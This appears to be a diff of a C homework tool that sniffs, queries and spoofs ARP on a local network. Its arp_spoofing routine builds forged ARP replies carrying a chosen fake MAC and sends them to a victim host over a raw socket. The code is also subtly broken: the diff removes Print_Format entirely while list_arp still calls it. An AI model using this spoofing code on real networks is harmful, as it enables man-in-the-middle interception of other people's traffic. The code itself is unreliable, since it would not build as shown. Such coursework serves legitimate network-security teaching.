@@ -9,19 +9,14 @@
 #include "arp.h"
 #include <netinet/in.h>
 #include <arpa/inet.h>
-
-
 #include <fcntl.h> // for open
 #include <unistd.h> // for close
-
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <math.h>
 
-
 //----------------
-static void Print_Format();
 void list_arp(char *argv[]);
 void arp_preprocess(struct ether_addr *mac, struct in_addr *ip);
 void print_arp(struct ether_arp *arp);
@@ -30,14 +25,15 @@ void pre_arp_spoofing(char *argv[]);
 void arp_spoofing(struct ether_addr *fakemac, struct ether_arp *packet);
 void reply_arp_fake(struct ether_addr *mac, struct in_addr *ip);
 void reply_packet(struct ether_addr *mac, struct ether_arp *pa, struct arp_packet *reply, struct sockaddr_ll *vt);
-//void pre_arp_query(char *argv[]);
 //----------------
+
 /* 
  * Change "enp2s0f5" to your device name (e.g. "eth0"), when you test your hoework.
  * If you don't know your device name, you can use "ifconfig" command on Linux.
  * You have to use "enp2s0f5" when you ready to upload your homework.
  */
 //#define DEVICE_NAME "enp2s0f5"
+
 #define DEVICE_NAME "ens33"
 
 /*
@@ -45,16 +41,8 @@ void reply_packet(struct ether_addr *mac, struct ether_arp *pa, struct arp_packe
  * One for input , the other for output.
  */
 
+//store fake MAC 
 static char fmac[20];
-static void Print_Format()
-{
-	printf("Format:\n");
-	printf("1) ./arp -l -a\n");
-	printf("2) ./arp -l <filter_ip_address>\n");
-	printf("3) ./arp -q <query_ip_address>\n");
-	printf("4) ./arp <fake_mac_address> <target_ip_address>\n");
-	exit(0);
-}
  
 int main(int argc, char *argv[])
 {
@@ -66,19 +54,28 @@ int main(int argc, char *argv[])
 	else if( argc == 3 )
 	{
 		if(strcmp(argv[1],"-l")==0)
-			list_arp(argv); // ./arp list -a | filter IP address
+		{
+			puts("[   ARP sniffer mode   ]");
+			list_arp(argv); // ./arp list -a or filter IP address
+		}
 		else if(strcmp(argv[1],"-q")==0)
+		{
+			puts("[    ARP query mode    ]");
 			arp_query(argv);
+		}
 		else if(strlen(argv[1])==17 && strlen(argv[2])>=7)
+		{
+			puts("[   ARP spoofing mode   ]");
 			pre_arp_spoofing(argv);
+		}
 		else
 			printf("Format error !\nUsage: sudo %s -h for help\n",argv[0]);
-	
 	}
 	else 
 	{
-		if(argc<1)
+		if(argc==1 )
 			puts("ERROR: You must be root to use this tool!");
+			
 		else
 		{
 			//fprintf(stderr,"Usage: sudo %s [OPTION]... [ADDRESS]...\n",argv[1]);
@@ -89,27 +86,11 @@ int main(int argc, char *argv[])
 	
 	//clear recv/send buffer
 	/*bzero(buffer_recv,sizeof(buffer_recv));
-	bzero(buffer_send,sizeof(buffer_send));
-	bzero(&req, sizeof(req));
-	strcpy(req.ifr_name,DEVICE_NAME); //get IC name 
-	puts(&req);
-	socklen_t sa_len; 
-	sa_len = sizeof(struct sockaddr_ll);
-	
+
 	//Fill the parameters of the sa.
 	/*bzero(&sa, sizeof(sa));
-	sa.sll_family = PF_PACKET;
-	sa.sll_protocol = htons(ETH_P_ARP); //只接受發往本機mac的arp類型的資料幀
-	sa.sll_ifindex = if_nametoindex(DEVICE_NAME); //mappings between network interface names and indexes
-	
-	
 	
 	// Open a recv socket in data-link layer.
-	if((sockfd_recv = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
-	{
-		perror("open recv socket error");
-		exit(1);
-	}
 
 	/*
 	 * Use recvfrom function to get packet.
@@ -117,27 +98,10 @@ int main(int argc, char *argv[])
 	 */
 	/*recvfrom(sockfd_recv,buffer_recv,sizeof(buffer_recv),0,(struct sockaddr*)&sa, &sa_len);
 
-
-	
-	//Open a send socket in data-link layer.
-	if((sockfd_send = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
-	{
-		perror("open send socket error");
-		exit(sockfd_send);
-	}
-	
 	/*
 	 * Use ioctl function binds the send socket and the Network Interface Card.
 `	 * ioctl( ... )
 	 */
-	/*if( ioctl(sockfd_send, SIOCGIFADDR, &req)==-1)
-	{
-		perror("ioctl error");
-		exit(1);
-	}
-	
-	
-
 	
 	/*
 	 * use sendto function with sa variable to send your packet out
@@ -145,13 +109,6 @@ int main(int argc, char *argv[])
 	 */
 	/*sendto(sockfd_send,buffer_send,sizeof(buffer_send), 0, (struct sockaddr*)&sa, &sa_len);
 	
-	while(1)
-	{
-		bzero(buffer_recv,sizeof(buffer_recv));
-		recvfrom(sockfd_recv,buffer_recv,sizeof(buffer_recv),0,(struct sockaddr*)&sa, &sa_len);
-		puts(buffer_recv);
-	}
-
 */
 	return 0;
 }
@@ -159,19 +116,22 @@ int main(int argc, char *argv[])
 void list_arp(char *argv[])
 {
 	struct in_addr filter_ip;
+	
 	// ./arp -l -a
 	if(strcmp(argv[2], "-a") == 0)
 		arp_preprocess(NULL, NULL);
+		
 	else
 	{
 		filter_ip.s_addr = inet_addr(argv[2]);
 
-		// check for IP
+		// check IP
 		if(filter_ip.s_addr < 0)
 			Print_Format();
 		else
 			arp_preprocess(NULL, &filter_ip);	// ./arp list <target_ip_addr>
 	}
+	
 	return;
 }
 
@@ -187,7 +147,6 @@ void print_arp(struct ether_arp *arp)
 }
 void arp_query(char *argv[])
 {
-	puts("[    ARP query mode    ]");
 	struct arp_packet query;
 	struct ether_arp arp;
 	struct sockaddr_ll sa;
@@ -267,9 +226,7 @@ void arp_query(char *argv[])
 		read(sockfd, &arp, sizeof(arp));
 		if(memcmp(arp.arp_tpa, target_ip, sizeof(arp.arp_tpa)) ==0)
 			arp_query(arp,target_ip);
-	
 	}
-
 }*/
 
 void arp_preprocess(struct ether_addr *mac, struct in_addr *ip)
@@ -277,7 +234,7 @@ void arp_preprocess(struct ether_addr *mac, struct in_addr *ip)
 	struct ether_arp arp;
 	int sockfd;
 	
-	sockfd = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
+	sockfd = socket(PF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
 	//sockfd = socket(AF_PACKET,SOCK_DGRAM,htons(ETH_P_ARP));
 	
 	if(sockfd <0)
@@ -291,7 +248,9 @@ void arp_preprocess(struct ether_addr *mac, struct in_addr *ip)
 		read(sockfd, &arp, sizeof(arp));
 		
 		if(ip ==NULL)
+		{
 			print_arp(&arp);
+		}
 			
 		else
 		{
@@ -299,21 +258,20 @@ void arp_preprocess(struct ether_addr *mac, struct in_addr *ip)
 			{
 				if(mac != NULL)
 				{
-					puts("[   ARP spoofing mode   ]");
 					print_arp(&arp);
 					arp_spoofing(mac, &arp); // ./arp <fake_mac_address> <target_ip_address>
 				}	
 				
 				else
+				{
 					print_arp(&arp); //Print ./arp -l <filter_ip_address>
+				}
 			}
 		}
 	}
 	close(sockfd);
 	return ;
 }
-
-
 
 void pre_arp_spoofing(char *argv[])
 {
@@ -349,7 +307,7 @@ void arp_spoofing(struct ether_addr *fakemac, struct ether_arp *packet)
 	struct arp_packet rp;
 	struct sockaddr_ll victim;
 	
-	sendfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP)); //reply socket
+	sendfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP)); //reply socket
 	bzero(&victim, sizeof(victim));
 	
 	// set packet hardware 
@@ -370,6 +328,7 @@ void arp_spoofing(struct ether_addr *fakemac, struct ether_arp *packet)
 	
 	// set 
 	victim.sll_family = AF_PACKET;
+	//another way to find interface index
 	victim.sll_ifindex = if_nametoindex(DEVICE_NAME);
 	//victim.sll_ifindex = getInterfaceByName(sendfd, DEVICE_NAME);
 	victim.sll_halen = ETH_ALEN;
@@ -388,33 +347,4 @@ void arp_spoofing(struct ether_addr *fakemac, struct ether_arp *packet)
 	close(sendfd);
 	
 }
-
-/*void reply_packet(struct ether_addr *mac, struct ether_arp *pa, struct arp_packet *reply, struct sockaddr_ll *vt)
-{
-	memcpy(reply->eth_hdr.ether_dhost, pa->arp_sha, ETH_ALEN);
-	memcpy(reply->eth_hdr.ether_shost, mac, ETH_ALEN);
-	reply->eth_hdr.ether_type = htons(ETH_P_ARP);
-	
-	set_hard_type(reply->arp, ARPHRD_ETHER); // ethernet
-	set_hard_size(reply->arp, ETH_ALEN); // ehternet length
-	set_prot_type(reply->arp,ETHERTYPE_IP); // IP 
-	set_prot_size(reply->arp, 4); // IP length        
-	set_op_code(&rp.arp, ARPOP_REPLY); //set ARP op code -reply 
-	
-	set_sender_hardware_addr(&rp.arp, (unsigned char *)fakemac);
-	set_sender_protocol_addr(&rp.arp, (unsigned char *)(pa->arp_tpa));
-	set_target_hardware_addr(&rp.arp, (unsigned char *)(pa->arp_sha)); // set target hrd as orig sender hrd
-	set_target_protocol_addr(&rp.arp, (unsigned char *)(pa->arp_spa));	// set target pa as orig sender pa
-	
-	
-	
-	vt->sll_family = AF_PACKET;
-	vt->sll_ifindex = if_nametoindex(DEVICE_NAME);
-	//victim.sll_ifindex = getInterfaceByName(sendfd, DEVICE_NAME);
-	vt->sll_halen = ETH_ALEN;
-	memcpy(vt->sll_addr, mac, ETH_ALEN);
-
-}*/
-
-
 
